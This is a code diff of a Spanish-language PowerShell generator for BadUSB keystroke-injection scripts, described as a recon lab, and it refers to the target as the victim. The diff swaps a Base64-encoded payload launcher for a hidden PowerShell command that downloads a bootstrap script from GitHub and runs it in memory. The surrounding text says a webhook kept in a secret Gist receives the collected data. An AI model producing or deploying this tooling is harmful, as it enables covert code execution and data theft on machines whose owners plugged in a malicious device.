@@ -48,51 +48,35 @@ if (-not $Webhook -or $Webhook -notmatch "^https?://") {
     exit 1
 }
 
-# --- 2. Comando de PowerShell que se ejecutara en la victima ---
-$cmd = '$w="' + $Webhook + '"; $p=(iwr "' + $PayloadUrl + '" -UseBasicParsing).Content -join "`n"; $p=$p -replace "PLACEHOLDER_WEBHOOK",$w; iex $p'
+# --- 2. URL del bootstrap ---
+$BootstrapUrl = "https://raw.githubusercontent.com/AndYLndR/badusb-recon/main/payloads/bootstrap.ps1"
 
-# --- 3. Codificar el comando a UTF-16LE -> Base64 ---
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
-$b64   = [Convert]::ToBase64String($bytes)
-
-# --- 4. Verificacion: decodificar y comprobar ---
-$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
-if ($decoded -ne $cmd) {
-    Write-Host "[-] Verificacion fallida del Base64. Abortando." -ForegroundColor Red
-    exit 1
-}
-Write-Host "[+] Verificacion OK del comando codificado." -ForegroundColor Green
-
-# --- 5. Generar el Ducky Script ---
+# --- 3. Generar el Ducky Script ---
 $ducky = @"
 REM ============================================================
 REM BadUSB Recon Lab - Ducky Script generado automaticamente
 REM Fecha: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
-REM Metodo: download + inyeccion de webhook (via -EncodedCommand)
-REM IMPORTANTE: no subir este archivo al repo (contiene tu webhook)
+REM Metodo: bootstrap (descarga + ejecucion en memoria)
 REM ============================================================
 
 DELAY 1000
 GUI r
 DELAY 800
-STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $b64
+STRING powershell -WindowStyle Hidden -c "iex(iwr '$BootstrapUrl' -UseBasicParsing).Content"
 ENTER
 "@
 
 [IO.File]::WriteAllText($OutputPath, $ducky)
 
-# --- 6. Resumen ---
+# --- 4. Resumen ---
 Write-Host ""
 Write-Host "=== RESUMEN ===" -ForegroundColor Yellow
-Write-Host "  Metodo       : download + inyeccion en runtime (-EncodedCommand)"
-Write-Host "  Payload URL  : $PayloadUrl"
-Write-Host "  Webhook      : $($Webhook.Substring(0, [Math]::Min(60, $Webhook.Length)))..."
-Write-Host "  Comando plain: $($cmd.Length) chars"
-Write-Host "  Base64       : $($b64.Length) chars"
+Write-Host "  Metodo       : bootstrap + ejecucion en memoria"
+Write-Host "  Bootstrap    : $BootstrapUrl"
 Write-Host "  Ducky Script : $OutputPath"
 Write-Host "  Longitud     : $($ducky.Length) caracteres"
 Write-Host ""
 Write-Host "  Recuerda:" -ForegroundColor Yellow
-Write-Host "   - El Ducky Script contiene tu webhook (dentro del Base64)."
-Write-Host "   - NO lo subas al repo."
-Write-Host "   - El payload.ps1 debe estar accesible en la URL indicada."
+Write-Host "   - El webhook ahora vive en el Gist secreto, NO en el Ducky."
+Write-Host "   - Actualiza \$ConfigUrl en bootstrap.ps1 si cambias de Gist."
+Write-Host "   - El payload.ps1 debe estar accesible en GitHub raw."
